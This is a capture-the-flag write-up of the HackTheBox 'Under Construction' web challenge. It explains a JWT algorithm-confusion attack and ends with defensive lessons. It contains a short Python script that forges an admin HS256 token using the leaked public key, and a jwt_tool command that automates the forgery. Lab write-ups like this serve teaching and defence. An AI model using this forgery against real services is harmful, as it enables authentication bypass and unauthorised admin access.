---
title: "HackTheBox - Under Construction (JWT Algorithm Confusion)"
description: "JWT algorithm confusion attack. The server accepted RS256 tokens verified with a public key, which could be re-signed using HS256 with that same public key as the HMAC secret."
platform: "HackTheBox"
category: "Web"
difficulty: "Medium"
date: 2026-01-22
---

## Challenge Info

**Platform:** HackTheBox
**Category:** Web
**Difficulty:** Medium

## Recon

After logging in the app gives you a JWT. I decoded the header and saw `"alg": "RS256"`, so it's using asymmetric signing (private key to sign, public key to verify).

The public key was sitting at `/static/jwks.json`. That was the key finding.

## The Attack

RS256 is asymmetric: you sign with a private key and verify with a public key. HS256 is symmetric: the same key is used for both. The vulnerability is that if the server doesn't enforce which algorithm to use, you can:

1. Grab the public key from `/static/jwks.json`
2. Change `alg` to `HS256` in the token header
3. Re-sign your modified payload using the public key as the HMAC secret

When the server verifies it, it looks up the key it uses for verification (the public key) and uses it as the HS256 secret. It ends up accepting your forged token.

## Exploit

```python
import jwt

pub_key = """-----BEGIN PUBLIC KEY-----
<key from jwks.json>
-----END PUBLIC KEY-----"""

payload = {
    "username": "admin",
    "pk": pub_key,
    "iat": 1700000000
}

forged = jwt.encode(payload, pub_key, algorithm="HS256")
print(forged)
```

Sending this in the `Authorization` header gave me admin access and the flag.

## Flag

```
HTB{d0n7_3xp053_y0ur_publ1ck3y}
```

## What I learned

- Exposing the public key is what makes this attack possible. If it's not public, it's much harder
- The server should always enforce which algorithm is allowed, never trust what the token header claims
- `jwt_tool` can automate this: `python3 jwt_tool.py <token> -X k -pk public.pem`
